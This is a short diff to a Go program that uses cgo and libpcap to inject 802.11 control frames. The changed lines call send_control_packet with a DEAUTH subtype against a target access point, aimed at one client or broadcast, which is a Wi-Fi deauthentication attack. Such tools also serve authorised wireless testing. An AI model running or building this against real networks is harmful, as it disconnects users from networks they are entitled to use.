@@ -1,5 +1,15 @@
 package main
 
+/*
+#cgo LDFLAGS: -lpcap
+#include <stdint.h>
+#include <pcap.h>
+
+#define DEAUTH 0xC0
+#define DISASSOC 0xA0
+
+extern void send_control_packet(pcap_t *handle, uint8_t *bssid, uint8_t *client, uint8_t subtype, uint16_t reason_code);
+*/
 import "C"
 import (
 	"flag"
@@ -74,7 +84,7 @@ func capturePackets() {
 			if args.targetClient != nil {
 				if ethernet.DstMAC.String() == args.targetClient.String() {
 					C.send_control_packet(
-						(*C.pcap_t)(handle),
+						handle,
 						(*C.uint8_t)(&args.targetAP[0]),
 						(*C.uint8_t)(&args.targetClient[0]),
 						C.DEAUTH,
@@ -83,7 +93,7 @@ func capturePackets() {
 				}
 			} else {
 				C.send_control_packet(
-					(*C.pcap_t)(handle),
+					handle,
 					(*C.uint8_t)(&args.targetAP[0]),
 					nil,
 					C.DEAUTH,
